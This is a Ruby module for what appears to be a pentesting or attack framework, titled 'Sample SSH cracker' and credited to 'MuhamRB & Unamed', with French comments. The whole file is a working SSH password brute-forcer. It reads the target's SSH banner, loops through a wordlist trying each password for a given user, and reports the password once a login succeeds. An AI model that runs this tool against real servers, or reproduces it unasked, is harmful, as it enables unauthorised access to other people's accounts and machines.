class CentauriusModule

	require 'net/ssh'
	require 'socket'
	require_relative '../../Utilities/Design'
  #Creation d'un guetteur pour recuperer la valeur des variable lors de l'instance
  attr_accessor :infos, :param

	@@design = Design::Design.new

  def initialize

      #setteur d'une variable infos stockant un hash avec
      #Auteur du module description du module et le titre de votre exploit

    @infos = {:Author => 'MuhamRB & Unamed', :Description => 'Sample ssh cracker with wordlist', :Title => 'Sample SSH cracker'}


      #setteur d'une variable param qui va stocker tout les parametre demandé pour votre script par l'intermediaire
      #d'un Hash
    @param = {'rhost' => nil, 'ruser' => nil, 'wordlist' => nil}
  end

	def versionSSH()
		s = TCPSocket.new(@param['rhost'], 22)
		return s.recv(1024)
	end

	def checkFileExist
		if File.file?(@param['wordlist'])
			return true
		else
			return false
		end

	end




	def loginSSH(rhost, ruser, password)
		begin
    	ssh_connect = Net::SSH.start(rhost,ruser, :password => password, :auth_methods => ["password"], :number_of_password_prompts => 0)
		rescue Net::SSH::AuthenticationFailed => auth
			puts "Incorrect -> #{password}".red
		else
			abort("SSH cracked: Password => #{"#{password}".magenta}")
			exit
		end
	end

    #Definition d'une function Main qui est la fonction principal
    #c'est elle qui va stocker tout le code principal pour votre module
    #notre framework fera seulement appelle à cette fonction pour executer le code
    #de votre module

  def Main()
    #code principal
    puts "\033[1;91m[\033[1;94m*\033[1;91m]\033[00m Connecting #{@param['rhost']}..."
		puts "\033[1;91m[\033[1;94m*\033[1;91m]\033[00m Version SSH: #{versionSSH()}"
		if checkFileExist() == true
			liness = File.readlines(@param['wordlist'])
			i = 0
			while i < liness.size
				thr = Thread.new {loginSSH(@param['rhost'], @param['ruser'], liness[i].chomp)}
				thr.join
				i += 1
			end
		else
			puts "#{@param['wordlist']} not found".red
		end
  end


end
